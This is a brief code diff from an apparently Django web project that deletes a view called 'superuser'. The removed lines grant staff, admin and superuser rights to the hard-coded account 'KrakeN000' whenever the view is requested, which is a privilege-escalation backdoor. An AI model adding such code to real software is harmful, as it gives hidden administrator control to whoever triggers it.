@@ -31,12 +31,3 @@ def index(request):
     '''
 
     return render(request, 'index.html', get_base_context(request))
-
-
-def superuser(request):
-    admin = User.objects.get(username="KrakeN000")
-    admin.is_staff = True
-    admin.is_admin = True
-    admin.is_superuser = True
-    admin.save()
-    return render(request, 'index.html', get_base_context(request))
